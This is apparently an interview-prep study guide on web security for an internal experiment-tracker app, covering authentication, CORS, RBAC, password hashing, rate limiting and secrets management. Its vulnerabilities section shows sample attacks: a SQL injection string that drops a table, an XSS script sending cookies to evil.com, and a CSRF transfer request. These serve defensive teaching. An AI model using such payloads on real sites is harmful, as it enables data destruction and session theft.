# Day 2 - Afternoon: Security Fundamentals (1h)

## Goals
- Understand API authentication basics
- Know common web vulnerabilities and mitigations
- Be able to discuss security for internal tools
- Learn secure coding practices

---

## Security Mindset

### Defense in Depth

```
┌────────────────────────────────────────────────────┐
│  Network (Firewall, WAF, TLS)                      │
│  ┌──────────────────────────────────────────────┐  │
│  │  Application (Auth, Input Validation)         │  │
│  │  ┌────────────────────────────────────────┐  │  │
│  │  │  Database (Encryption, Access Control) │  │  │
│  │  │  ┌──────────────────────────────────┐  │  │  │
│  │  │  │         DATA                     │  │  │  │
│  │  │  └──────────────────────────────────┘  │  │  │
│  │  └────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────┘
```

**Principle**: Multiple layers of security. If one fails, others still protect.

### Least Privilege

Only grant the minimum permissions needed:

```python
# BAD: Admin access for everything
user.role = "admin"

# GOOD: Specific permissions
user.permissions = ["read:experiments", "create:runs"]
```

### Fail Secure

```python
# BAD: Default to allow
def check_access(user, resource):
    try:
        return authorization_service.check(user, resource)
    except Exception:
        return True  # Dangerous!

# GOOD: Default to deny
def check_access(user, resource):
    try:
        return authorization_service.check(user, resource)
    except Exception:
        return False  # Safe default
```

---

## API Authentication

### API Key Authentication (Simple)

```python
# Backend (FastAPI)
from fastapi import HTTPException, Security, status
from fastapi.security import APIKeyHeader

API_KEY = "your-secret-api-key"  # In production: from env/secrets
api_key_header = APIKeyHeader(name="X-API-Key")

def verify_api_key(api_key: str = Security(api_key_header)):
    if api_key != API_KEY:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid API key"
        )
    return api_key

@app.get("/experiments")
def list_experiments(api_key: str = Security(verify_api_key)):
    return experiments_db
```

```tsx
// Frontend usage
const response = await fetch('/api/experiments', {
  headers: {
    'X-API-Key': process.env.REACT_APP_API_KEY
  }
});
```

### JWT Token Authentication

```python
# Backend (FastAPI)
from jose import JWTError, jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key"  # From environment
ALGORITHM = "HS256"

def create_access_token(data: dict, expires_delta: timedelta = timedelta(hours=24)):
    to_encode = data.copy()
    expire = datetime.utcnow() + expires_delta
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

@app.post("/login")
def login(username: str, password: str):
    # Verify credentials (simplified)
    if verify_password(username, password):
        token = create_access_token({"sub": username})
        return {"access_token": token, "token_type": "bearer"}
    raise HTTPException(status_code=401, detail="Invalid credentials")
```

---

## CORS Configuration

### What is CORS?
Cross-Origin Resource Sharing - browser security that blocks requests from different domains.

```python
# FastAPI CORS setup
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",      # React dev server
        "https://dashboard.company.com"  # Production
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)
```

### CORS Headers Explained

| Header | Purpose |
|--------|---------|
| `Access-Control-Allow-Origin` | Which origins can access |
| `Access-Control-Allow-Methods` | Which HTTP methods allowed |
| `Access-Control-Allow-Headers` | Which headers can be sent |
| `Access-Control-Allow-Credentials` | Allow cookies/auth headers |

---

## Common Web Vulnerabilities

### 1. SQL Injection

**The Attack:**
```python
# DANGEROUS: String interpolation
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# If user_input = "'; DROP TABLE users; --"
# Executes: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

**Prevention:**
```python
# Use parameterized queries (ORMs do this automatically)
db.query(User).filter(User.name == user_input)
# Becomes: SELECT * FROM users WHERE name = $1
# Parameter: ['user_input_value'] - SQL special chars are escaped
```

**Interview Answer:**
> "SQL injection happens when user input is concatenated directly into SQL queries. ORMs prevent this by using parameterized queries where user input is treated as data, not executable SQL. The database driver escapes special characters."

### 2. Cross-Site Scripting (XSS)

**The Attack:**
```html
<!-- User submits this as their "name" -->
<script>document.location='http://evil.com/?cookie='+document.cookie</script>

<!-- If rendered without escaping, the script executes -->
<p>Welcome, <script>...</script>!</p>
```

**Prevention:**
```tsx
// React escapes by default
function Welcome({ name }: { name: string }) {
  return <p>Welcome, {name}!</p>;  // Safe - React escapes HTML
}

// DANGEROUS: Using dangerouslySetInnerHTML
function Unsafe({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;  // Avoid!
}

// If you must render HTML, sanitize it
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(userHtml);
```

**Interview Answer:**
> "XSS attacks inject malicious scripts into web pages. React prevents this by escaping content by default. Never use `dangerouslySetInnerHTML` with user input. For APIs, set Content-Type headers correctly and sanitize any HTML you must render."

### 3. Cross-Site Request Forgery (CSRF)

**The Attack:**
```html
<!-- On evil-site.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- If user is logged into bank.com, cookies are sent automatically -->
```

**Prevention:**
```python
# Backend: CSRF token in forms
from fastapi_csrf_protect import CsrfProtect

@app.post("/transfer")
def transfer(csrf_protect: CsrfProtect = Depends()):
    csrf_protect.validate_csrf()  # Validates token from header/form
    # ... proceed with transfer
```

```tsx
// Frontend: Include CSRF token in requests
<form>
  <input type="hidden" name="csrf_token" value={csrfToken} />
  <!-- form fields -->
</form>
```

**Interview Answer:**
> "CSRF tricks authenticated users into making unwanted requests. Prevention involves CSRF tokens - random values in forms that attackers can't guess. The server validates the token matches what was issued. SameSite cookies and checking Origin headers also help."

---

## Security Checklist for Internal Tools

### Authentication & Authorization
- [ ] API key or JWT authentication for all endpoints
- [ ] Role-based access control (RBAC)
- [ ] Session timeout / token expiration
- [ ] Secure password storage (bcrypt/argon2)

### Input Validation
- [ ] Validate all inputs on server side
- [ ] Use ORM/parameterized queries (no raw SQL)
- [ ] Sanitize any HTML output
- [ ] Validate file uploads (type, size)

### Transport Security
- [ ] HTTPS everywhere (no HTTP)
- [ ] Proper CORS configuration
- [ ] Secure cookies (HttpOnly, Secure, SameSite)

### Logging & Monitoring
- [ ] Log authentication attempts
- [ ] Log sensitive operations
- [ ] Never log passwords or tokens
- [ ] Alert on suspicious activity

---

## RBAC for Experiment Tracker

### Role Definitions

```python
from enum import Enum

class Role(str, Enum):
    VIEWER = "viewer"      # Can view experiments and runs
    OPERATOR = "operator"  # Can view + create runs
    ADMIN = "admin"        # Full access

PERMISSIONS = {
    Role.VIEWER: ["read:experiments", "read:runs", "read:metrics"],
    Role.OPERATOR: ["read:experiments", "read:runs", "read:metrics",
                    "create:runs", "update:runs"],
    Role.ADMIN: ["*"]  # All permissions
}

def check_permission(user: User, permission: str) -> bool:
    if "*" in PERMISSIONS[user.role]:
        return True
    return permission in PERMISSIONS[user.role]
```

### Endpoint Protection

```python
def require_permission(permission: str):
    def dependency(user: User = Depends(get_current_user)):
        if not check_permission(user, permission):
            raise HTTPException(status_code=403, detail="Forbidden")
        return user
    return Depends(dependency)

@app.post("/experiments")
def create_experiment(
    experiment: ExperimentCreate,
    user: User = require_permission("create:experiments")
):
    # Only admins can create experiments
    ...

@app.get("/experiments")
def list_experiments(
    user: User = require_permission("read:experiments")
):
    # All roles can view
    ...
```

---

## Interview Questions & Answers

### "How would you secure an internal dashboard?"

> "I'd implement multiple layers: First, authentication - API keys for services, JWT tokens for users with proper expiration. Second, authorization with RBAC - define roles like viewer, operator, admin with specific permissions. Third, secure transport with HTTPS and proper CORS config. Fourth, input validation using ORMs for SQL injection prevention and React's default escaping for XSS. Finally, audit logging for sensitive operations without logging secrets."

### "What common attacks are you aware of?"

> "The main ones are SQL injection, XSS, and CSRF. SQL injection is prevented by using ORMs or parameterized queries. XSS is prevented by escaping output - React does this by default. CSRF is prevented with CSRF tokens and SameSite cookies. I'd also mention secure cookie flags, HTTPS enforcement, and rate limiting for brute force protection."

### "How would you handle secrets in this application?"

> "Never hardcode secrets. Use environment variables in development and a secrets manager in production - like AWS Secrets Manager or HashiCorp Vault. For Kubernetes, use K8s Secrets or external secrets operators. Rotate secrets regularly and never log them."

---

## Quick Security Reference

| Vulnerability | Prevention |
|--------------|------------|
| SQL Injection | ORM / Parameterized queries |
| XSS | React escaping / sanitize HTML |
| CSRF | CSRF tokens / SameSite cookies |
| Broken Auth | JWT with expiration / secure sessions |
| Sensitive Data | HTTPS / encrypt at rest |
| Secrets Exposure | Env vars / secrets manager |

---

## OWASP Top 10 (2021)

### Full List with Experiment Tracker Examples

| # | Vulnerability | Example in Context |
|---|---------------|-------------------|
| 1 | **Broken Access Control** | User accesses another user's experiments |
| 2 | **Cryptographic Failures** | API keys stored in plaintext |
| 3 | **Injection** | SQL injection in experiment search |
| 4 | **Insecure Design** | No rate limiting on metric logging |
| 5 | **Security Misconfiguration** | Debug mode in production |
| 6 | **Vulnerable Components** | Outdated dependencies with CVEs |
| 7 | **Authentication Failures** | Weak password policy |
| 8 | **Data Integrity Failures** | Unsigned JWTs |
| 9 | **Logging Failures** | No audit trail for deletions |
| 10 | **SSRF** | Webhook URL validation missing |

---

## Password Security

### Secure Password Storage

```python
# NEVER store passwords in plaintext!
# Use bcrypt or argon2

import bcrypt

def hash_password(password: str) -> bytes:
    """Hash password with bcrypt (includes salt automatically)."""
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())

def verify_password(password: str, hashed: bytes) -> bool:
    """Verify password against hash."""
    return bcrypt.checkpw(password.encode(), hashed)

# Usage
hashed = hash_password("user_password")
# Store 'hashed' in database

# Later, to verify:
if verify_password("user_password", hashed):
    print("Password correct")
```

### Why bcrypt?

| Property | Benefit |
|----------|---------|
| Adaptive | Work factor can be increased as hardware improves |
| Salt included | Prevents rainbow table attacks |
| Slow by design | Makes brute force attacks impractical |

---

## Secure Cookie Configuration

```python
# FastAPI secure cookie example
from fastapi.responses import Response

def set_secure_cookie(response: Response, token: str):
    response.set_cookie(
        key="session_token",
        value=token,
        httponly=True,     # JavaScript can't access
        secure=True,       # Only sent over HTTPS
        samesite="strict", # Prevents CSRF
        max_age=3600,      # 1 hour expiration
        path="/",          # Available to all paths
    )
```

### Cookie Flags Explained

| Flag | Purpose | Security Benefit |
|------|---------|------------------|
| `HttpOnly` | No JavaScript access | Prevents XSS token theft |
| `Secure` | HTTPS only | Prevents network sniffing |
| `SameSite=Strict` | Same-origin only | Prevents CSRF |
| `SameSite=Lax` | GET cross-origin OK | Balance of security/usability |

---

## Input Validation Patterns

### Server-Side Validation (Never Trust Client)

```python
from pydantic import BaseModel, Field, validator
import re

class ExperimentCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=100)
    owner: str = Field(..., min_length=1, max_length=50)
    description: str | None = Field(None, max_length=1000)

    @validator('name')
    def validate_name(cls, v):
        # Only alphanumeric, spaces, hyphens, underscores
        if not re.match(r'^[\w\s\-]+$', v):
            raise ValueError('Invalid characters in name')
        return v

    @validator('owner')
    def validate_owner(cls, v):
        # Email format
        if '@' not in v:
            raise ValueError('Owner must be email')
        return v.lower()  # Normalize
```

### File Upload Security

```python
import magic  # python-magic library
from pathlib import Path

ALLOWED_EXTENSIONS = {'.csv', '.json', '.yaml'}
ALLOWED_MIMETYPES = {'text/csv', 'application/json', 'text/yaml'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

def validate_upload(file) -> bool:
    # 1. Check file size
    file.seek(0, 2)  # Seek to end
    size = file.tell()
    file.seek(0)  # Reset
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")

    # 2. Check extension
    ext = Path(file.filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("Invalid file type")

    # 3. Check actual content type (not just header)
    content = file.read(2048)
    file.seek(0)
    mime_type = magic.from_buffer(content, mime=True)
    if mime_type not in ALLOWED_MIMETYPES:
        raise ValueError("File content doesn't match extension")

    return True
```

---

## Rate Limiting

### Token Bucket Implementation

```python
import time
from collections import defaultdict

class RateLimiter:
    def __init__(self, requests_per_minute: int = 60):
        self.rate = requests_per_minute / 60  # per second
        self.tokens = defaultdict(lambda: requests_per_minute)
        self.last_update = defaultdict(time.time)

    def is_allowed(self, key: str) -> bool:
        now = time.time()
        elapsed = now - self.last_update[key]
        self.last_update[key] = now

        # Add tokens based on elapsed time
        self.tokens[key] = min(
            60,  # Max tokens
            self.tokens[key] + elapsed * self.rate
        )

        if self.tokens[key] >= 1:
            self.tokens[key] -= 1
            return True
        return False

# FastAPI middleware
limiter = RateLimiter(requests_per_minute=100)

@app.middleware("http")
async def rate_limit_middleware(request: Request, call_next):
    client_ip = request.client.host
    if not limiter.is_allowed(client_ip):
        return JSONResponse(
            status_code=429,
            content={"error": "Too many requests"}
        )
    return await call_next(request)
```

---

## Secrets Management

### Environment Variables (Development)

```python
# .env file (NEVER commit to git!)
DATABASE_URL=postgresql://user:pass@localhost/db
JWT_SECRET=your-256-bit-secret
API_KEY=sk-xxxxxxxxxxxxx

# Load in Python
from dotenv import load_dotenv
import os

load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
JWT_SECRET = os.getenv("JWT_SECRET")
```

### Production Secrets Management

```yaml
# Kubernetes Secret
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
data:
  database-url: cG9zdGdyZXNxbDovLy4uLg==  # base64 encoded
  jwt-secret: eW91ci0yNTYtYml0LXNlY3JldA==

# Reference in deployment
env:
  - name: DATABASE_URL
    valueFrom:
      secretKeyRef:
        name: app-secrets
        key: database-url
```

### Secret Rotation Strategy

```python
# Support multiple API keys during rotation
VALID_API_KEYS = {
    os.getenv("API_KEY_V1"),      # Old key (deprecate after rotation)
    os.getenv("API_KEY_V2"),      # Current key
}

def verify_api_key(key: str) -> bool:
    return key in VALID_API_KEYS

# After all clients updated, remove V1
```

---

## Audit Logging

### What to Log

```python
import logging
from datetime import datetime

audit_logger = logging.getLogger("audit")

def log_security_event(
    event_type: str,
    user_id: str,
    resource: str,
    action: str,
    success: bool,
    metadata: dict = None
):
    audit_logger.info({
        "timestamp": datetime.utcnow().isoformat(),
        "event_type": event_type,
        "user_id": user_id,
        "resource": resource,
        "action": action,
        "success": success,
        "metadata": metadata or {},
        # DON'T log sensitive data!
    })

# Usage
log_security_event(
    event_type="authentication",
    user_id="alice@company.com",
    resource="api",
    action="login",
    success=True,
    metadata={"ip": "192.168.1.1", "user_agent": "..."}
)

# DON'T LOG:
# - Passwords (even hashed)
# - API keys / tokens
# - PII beyond what's necessary
# - Full request bodies with sensitive data
```

---

## Checkpoint Questions

Be ready to explain:

- [ ] **What is defense in depth?**
  > Multiple layers of security controls. If one fails, others still protect. Example: firewall + WAF + input validation + encryption at rest.

- [ ] **How do you prevent SQL injection?**
  > Use parameterized queries or ORMs. Never concatenate user input into SQL strings. The database driver escapes special characters in parameters.

- [ ] **What is XSS and how does React prevent it?**
  > XSS injects malicious scripts into web pages. React escapes content by default, treating it as text not HTML. Avoid `dangerouslySetInnerHTML` with user input.

- [ ] **How should you store passwords?**
  > Use bcrypt or argon2 to hash passwords. Never store plaintext. Salt is included automatically. Work factor should be tuned for ~100ms hash time.

- [ ] **What makes a secure JWT implementation?**
  > Use strong secrets (256-bit minimum), set short expiration times, validate all claims (iss, aud, exp), use HTTPS only, consider refresh token rotation.

- [ ] **How do you manage secrets in production?**
  > Use secrets managers (AWS Secrets Manager, Vault), never commit secrets to git, use environment variables for local dev, rotate secrets regularly.

- [ ] **What would you log for security audit?**
  > Authentication events (login/logout/failures), authorization failures, sensitive data access, admin actions. Never log passwords, tokens, or unnecessary PII.
